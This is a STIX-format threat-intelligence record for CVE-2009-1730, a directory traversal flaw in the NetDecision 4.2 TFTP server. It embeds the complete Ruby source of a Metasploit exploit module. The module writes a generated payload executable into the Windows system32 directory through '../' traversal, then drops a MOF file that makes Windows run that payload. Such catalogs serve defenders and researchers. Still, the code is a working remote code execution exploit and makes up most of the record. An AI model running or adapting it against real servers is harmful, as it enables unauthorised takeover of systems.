{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52ba7dee-5ca6-4aed-b9c3-989f0ac49af2",
    "created": "2024-08-14T16:50:24.594344Z",
    "modified": "2024-08-14T16:50:24.594349Z",
    "name": "\"NetDecision 4.2 TFTP Writable Directory Traversal Execution\"",
    "description": " This module exploits a vulnerability found in NetDecision 4.2 TFTP server. The software contains a directory traversal vulnerability that allows a remote attacker to write arbitrary file to the file system, which results in code  execution under the context of user executing the TFTP Server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/netdecision_tftp_traversal.rb",
            "external_id": "netdecision_tftp_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1730"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Rex::Proto::TFTP\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"NetDecision 4.2 TFTP Writable Directory Traversal Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in NetDecision 4.2 TFTP server. The\n        software contains a directory traversal vulnerability that allows a remote attacker\n        to write arbitrary file to the file system, which results in code  execution under\n        the context of user executing the TFTP Server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Rob Kraus', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2009-1730'],\n          ['OSVDB', '54607'],\n          ['BID', '35002']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['NetDecision 4.2 TFTP on Windows XP SP3 / Windows 2003 SP2', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-05-16',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptInt.new('DEPTH', [false, \"Levels to reach base directory\",1]),\n      OptAddress.new('RHOST', [true, \"The remote TFTP server address\"]),\n      OptPort.new('RPORT', [true, \"The remote TFTP server port\", 69])\n    ])\n  end\n\n  def upload(filename, data)\n    tftp_client = Rex::Proto::TFTP::Client.new(\n      \"LocalHost\"  => \"0.0.0.0\",\n      \"LocalPort\"  => 1025 + rand(0xffff-1025),\n      \"PeerHost\"   => datastore['RHOST'],\n      \"PeerPort\"   => datastore['RPORT'],\n      \"LocalFile\"  => \"DATA:#{data}\",\n      \"RemoteFile\" => filename,\n      \"Mode\"       => \"octet\",\n      \"Context\"    => {'Msf' => self.framework, \"MsfExploit\" => self },\n      \"Action\"     => :upload\n    )\n\n    ret = tftp_client.send_write_request { |msg| print_status(msg) }\n    while not tftp_client.complete\n      select(nil, nil, nil, 1)\n      tftp_client.stop\n    end\n  end\n\n  def exploit\n    peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n\n    # Setup the necessary files to do the wbemexec trick\n    exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n    exe      = generate_payload_exe\n    mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n    mof      = generate_mof(mof_name, exe_name)\n\n    # Configure how deep we want to traverse\n    depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n    levels = \"../\" * depth\n\n    # Upload the malicious executable to C:\\Windows\\System32\\\n    print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n    upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n\n    # Let the TFTP server idle a bit before sending another file\n    select(nil, nil, nil, 1)\n\n    # Upload the mof file\n    print_status(\"#{peer} - Uploading .mof...\")\n    upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-05-16",
    "x_mitre_platforms": [
        "win'"
    ]
}